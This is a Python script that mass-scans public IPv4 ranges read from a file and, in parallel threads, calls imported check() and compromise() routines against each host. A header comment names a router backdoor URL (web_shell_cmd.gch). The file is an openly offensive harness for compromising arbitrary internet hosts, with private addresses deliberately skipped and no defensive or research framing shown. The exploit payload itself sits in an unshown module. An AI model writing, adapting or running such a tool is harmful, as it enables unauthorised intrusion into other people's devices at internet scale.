#!/usr/bin/env python3.4
#encoding: utf-8


#backdoor: http://IP/web_shell_cmd.gch
#details: http://www.freebuf.com/news/58137.html

import sys
import netaddr
import time
import socket
import random
import requests
import threading
import gc
from datetime import datetime
from log import log
from poc import check, compromise
from config import cc_file, max_thread

i = 0
f = open(cc_file, 'r')

class probe(threading.Thread): # each thread probe one cidr
    
    def __init__(self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip)

    def run(self):
        log(1, self.ip, 'started')
        #self.ip_cidr_list = list(netaddr.IPNetwork(self.cidr))   # too much memory wasted
        try:
            if check(self.ip):
                compromise(self.ip)
        except:
            log(1, 'run', '{}'.format(sys.exc_info()))

while True:
    line = f.readline()
    if len(line)==0:
        break
    ip_cidr_list = netaddr.IPNetwork(str(line)).iter_hosts() # iterator is fucking good
    for ip in ip_cidr_list:
        #if ip.is_unicast() and not ip.is_private() and check(str(ip)):
        if ip.is_unicast() and not ip.is_private():  # it should be faster if we put check in child thread
            while threading.active_count()>=max_thread:
                time.sleep(random.randint(3,7))
            new_thread = probe(ip)
            new_thread.daemon = True
            new_thread.start()
